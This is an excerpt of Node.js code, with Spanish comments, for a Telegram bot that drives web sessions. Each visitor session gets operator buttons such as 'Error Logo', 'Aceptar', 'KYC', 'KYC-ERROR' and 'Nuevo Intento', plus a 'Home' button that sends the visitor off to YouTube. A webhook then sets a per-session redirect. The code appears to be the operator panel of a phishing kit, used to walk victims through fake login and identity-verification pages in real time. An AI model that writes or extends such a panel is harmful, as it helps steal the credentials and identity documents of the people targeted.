...
// ====================================================================================
// 🎯 FUNCIONES DE MENÚ PARA CADA PASO
// ====================================================================================
...
function getMenuNuevoIngreso(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `go:index|${sessionId}` },
                { text: "✅ Aceptar", callback_data: `go:parental|${sessionId}` }
            ],
            [
                { text: "📸 KYC", callback_data: `go:verify|${sessionId}` },
                { text: "🏠 Home", callback_data: `go:https://youtube.com|${sessionId}` }
            ]
        ]
    };
}
...
function getMenuKYCCompleto(sessionId) {
    return {
        inline_keyboard: [
            ...
            [
                { text: "⚠️ KYC-ERROR", callback_data: `go:verify|${sessionId}` },
                { text: "🔄 Nuevo Intento", callback_data: `go:index2|${sessionId}` }
            ],
            [
                { text: "🏠 Home", callback_data: `go:https://youtube.com|${sessionId}` }
            ]
...
// ====================================================================================
// 🔄 WEBHOOK CON ELIMINACIÓN DE MENÚ
// ====================================================================================
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    ...
    if (callback_query) {
      ...
      // Si es una URL externa (comienza con http)
      if (route.startsWith('http://') || route.startsWith('https://')) {
        redirections.set(sessionId, route);
      } else {
        // Si es una ruta interna, agregar .html si no lo tiene
      ...
      await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
        ...
        text: `Redirigiendo → ${route}`,
        show_alert: false
      });

      console.log(`🔄 Redirección configurada: ${sessionId} → ${route}`);
    }
    res.sendStatus(200);
  } catch (err) {
